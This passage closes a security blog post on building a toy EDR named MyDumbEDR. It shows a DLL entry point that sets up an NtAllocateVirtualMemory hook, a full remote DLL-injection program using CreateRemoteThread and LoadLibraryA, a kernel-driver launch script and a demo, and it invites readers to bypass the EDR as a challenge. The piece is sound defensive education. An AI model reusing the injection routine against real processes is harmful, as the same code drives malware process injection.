</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (ul_reason_for_call){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH: {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// This DLL will not be loaded by any thread so we simply disable DLL_TRHEAD_ATTACH and DLL_THREAD_DETACH
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        DisableThreadLibraryCalls(hModule);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Calling WinAPI32 functions from the DllMain is a very bad practice 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// since it can basically lock the program loading the DLL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// Microsoft recommends not using any functions here except a few one like 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// CreateThread IF AND ONLY IF there is no need for synchronization
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// So basically we are creating a thread that will execute the InitHooksThread function 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// thus allowing us hooking the NtAllocateVirtualMemory function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL, <span style="color:#ae81ff">0</span>, InitHooksThread, NULL, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            CloseHandle(hThread);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Once the DLL created, we need to inject it into every process we want to monitore. That’s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MESSAGE_SIZE 2048
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_PATH 260
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    LPCWSTR pipeName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pipe</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">dumbedr-injector"</span>;
</span></span><span style="display:flex;"><span>    DWORD bytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wchar_t</span> target_binary_file[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> dll_path[] <span style="color:#f92672">=</span> <span style="color:#e6db74">"x64</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDRDLL.dll"</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> dll_full_path[MAX_PATH];
</span></span><span style="display:flex;"><span>    GetFullPathNameA(dll_path, MAX_PATH, dll_full_path, NULL);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">"Launching injector named pipe server, injecting %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, dll_full_path);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Creates a named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HANDLE hServerPipe <span style="color:#f92672">=</span> CreateNamedPipe(
</span></span><span style="display:flex;"><span>        pipeName,                 <span style="color:#75715e">// Pipe name to create
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_ACCESS_DUPLEX,       <span style="color:#75715e">// Whether the pipe is supposed to receive or send data (can be both)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_TYPE_MESSAGE,        <span style="color:#75715e">// Pipe mode (whether or not the pipe is waiting for data)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_UNLIMITED_INSTANCES, <span style="color:#75715e">// Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        MESSAGE_SIZE,             <span style="color:#75715e">// Number of bytes for output buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        MESSAGE_SIZE,             <span style="color:#75715e">// Number of bytes for input buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,                        <span style="color:#75715e">// Pipe timeout 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        NULL                      <span style="color:#75715e">// Security attributes (anonymous connection or may be needs credentials. )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (TRUE) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ConnectNamedPipe enables a named pipe server to start listening for incoming connections
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        BOOL isPipeConnected <span style="color:#f92672">=</span> ConnectNamedPipe(
</span></span><span style="display:flex;"><span>            hServerPipe, <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            NULL         <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">wchar_t</span> message[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isPipeConnected) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read from the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ReadFile(
</span></span><span style="display:flex;"><span>                hServerPipe,  <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>message,     <span style="color:#75715e">// Target buffer where to stock the output
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                MESSAGE_SIZE, <span style="color:#75715e">// Size of the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>bytesRead,   <span style="color:#75715e">// Number of bytes read from ReadFile
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                NULL          <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Casting the message into a DWORD
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            DWORD target_pid <span style="color:#f92672">=</span> _wtoi(message);
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"~&gt; Received process id %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, target_pid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Opening the process with necessary privileges 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_CREATE_THREAD <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION <span style="color:#f92672">|</span> PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_VM_READ, FALSE, target_pid);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (hProcess <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"Can't open handle, error: % lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Open handle on PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, target_pid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Looking for the LoadLibraryA function in the kernel32.dll
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            FARPROC loadLibAddress <span style="color:#f92672">=</span> GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">"kernel32.dll"</span>), <span style="color:#e6db74">"LoadLibraryA"</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (loadLibAddress <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"Could not find LoadLibraryA, error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Found LoadLibraryA function</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Allocating some memory wth read/write privileges
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            LPVOID vae_buffer;
</span></span><span style="display:flex;"><span>            vae_buffer <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (vae_buffer <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"Can't allocate memory, error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>                CloseHandle(hProcess);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Allocated: %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, MAX_PATH);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Writing the path of the DLL to inject: x64\Debug\MyDumbEDRDLL.dll
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            SIZE_T bytesWritten;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, vae_buffer, dll_full_path, MAX_PATH, <span style="color:#f92672">&amp;</span>bytesWritten)) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"Can't write into memory, error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
</span></span><span style="display:flex;"><span>                CloseHandle(hProcess);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Wrote %zu in %d process memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, bytesWritten, target_pid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Creating a thread that will call LoadLibraryA and the path of the MyDUMBEDRDLL to load as argument
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)loadLibAddress, vae_buffer, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"Can't launch remote thread, error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
</span></span><span style="display:flex;"><span>                CloseHandle(hProcess);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Launched remote thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Freeing allocated memory as well as handles
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
</span></span><span style="display:flex;"><span>            CloseHandle(hThread);
</span></span><span style="display:flex;"><span>            CloseHandle(hProcess);
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Closed handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">wchar_t</span> response[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>            swprintf_s(response, MESSAGE_SIZE, <span style="color:#e6db74">L</span><span style="color:#e6db74">"OK</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            DWORD pipeBytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Inform the driver that the injection was successful
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            WriteFile(
</span></span><span style="display:flex;"><span>                hServerPipe,       <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                response,          <span style="color:#75715e">// Buffer to write from
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                MESSAGE_SIZE,      <span style="color:#75715e">// Size of the buffer 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>pipeBytesWritten, <span style="color:#75715e">// Numbers of bytes written
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                NULL               <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Disconnect
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            DisconnectNamedPipe(
</span></span><span style="display:flex;"><span>                hServerPipe <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">"</span>);        
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Running all of that, we can see that the assembly code of the NtAllocateVirtualMemory function of the NTDLL.dll of a process that was injected is the following:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/ntallocatevirtualmemorywithjmp.png" alt="Disassembly of the NTAllocateVirtualMemory with jpm"></p>
<p>While a more legitimate disassembly code should look like this:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/ntallocatevirtualmemorywihtoutjmp.png" alt="Disassembly of the legitimate NtAllocateVirtualMemory"></p>
<p>As you can see the first assembly instruction of the hooked NtAllocateVirtualMemory function is a jmp which will redirect the code flow from the NTDLL.dll to the address “00007FFAA06A0FD6” which is… Our injected EDR’s DLL:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/jmpfromntdlltoedr.png" alt="Code flow from the NTDLL to the injected DLL"></p>
<p>At this point our EDR is fully fonctionnal! Let’s test it!</p>
<h1 id="viii-mydumbedr-demo">VIII/ MyDumbEDR demo</h1>
<p>Now that we have our two agents as well that the driver, we can compile them and launch the entire project to see it in action!
To simplify the launching of the entire EDR solution, I created a small batch script whose content is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>// Launches the kernel driver
</span></span><span style="display:flex;"><span>sc create mydumbedr type=kernel binpath=Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRDriver.sys
</span></span><span style="display:flex;"><span>sc start mydumbedr
</span></span><span style="display:flex;"><span>// Starts the StaticAnalyzer agent
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">start</span> cmd.exe /c Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRStaticAnalyzer.exe
</span></span><span style="display:flex;"><span>// Starts the RemoteInjector agent 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">start</span> cmd.exe /c Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRRemoteInjector.exe 
</span></span><span style="display:flex;"><span>// Starts dbgview.exe
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">start</span> dbgview.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> EDR's running, press any key to stop it
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pause</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Kills both agents and unloads the kernel driver
</span></span><span style="display:flex;"><span>taskkill /F /IM MyDumbEDRStaticAnalyzer.exe 
</span></span><span style="display:flex;"><span>taskkill /F /IM MyDumbEDRRemoteInjector.exe
</span></span><span style="display:flex;"><span>sc stop mydumbedr
</span></span><span style="display:flex;"><span>sc delete mydumbedr
</span></span></code></pre></div><p>Let’s run the EDR, open a notepad process that will be the target of the shellcode injection and run the ShellcodeInjector binary to see how the EDR works in live action:</p>
<video class="video-shortcode" preload="" controls="">
    <source src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/mydumbedr.mp4" type="video/mp4">
    There should have been a video here but your browser does not seem
    to support it.
</video>




<p>As you can see, the StaticAnalyzer agent detected that the binary was malicious. The RemoteInjector injected the MyDumbEDRDLL into the malicious process and when it tried to allocate a memory page with RWX to write and execute the shellcode, the EDR detected it and terminated the process thus protecting the notepad.exe process.</p>
<p>As such, we can say that our EDR is strong enough to detect both statically and dynamically malicious binaries trying to remotely inject a shellcode!!</p>
<h1 id="ix-conclusion">IX/ Conclusion</h1>
<p>Throughout this article we have seen how to develop a Windows driver, how to turn it into a EDR’s kernel driver and how to build a dummy EDR.</p>
<p>There are 3 reason why I wanted to create such a thing. First I wanted to understand more deeply how EDR’s are architectured so that I can learn how to analyse the ones I’m fighting against during assessments.</p>
<p>Second, I wanted to do these research to provide an article that can be used by anyone that’d like to understand how EDR’s work and give them a few ideas about how you can bypass one. For that reason, I’m leaving you with a challenge: bypass MyDumbEDR. On the following repo you will find all the source code of the EDR created in this blogpost as well as instructions to “capture the flag”. There are multiple ways you can use to bypass it so I encourage you read the code closely, I implemented some stupid logic that IS actually used by some EDR’s.</p>
<p>The last reason I wanted to work on building my EDR is to realise how complicated it is to create a functionnal one. As pentesters, and redteamers, we are used to saying things like “Huhu this EDR is shit, I bypassed it easily”. Yeah you did, congratz. But remember that building a security product that is able to both detect malicious behaviours and not create too much false positives is a pain in the ass. As such, I’d like to finish this article giving a huge thumbs up both to the security product developers as well as the blueteamers that are messing with the red’s during our assessments!</p>
<p>Happy hacking folks!</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  

</body></html>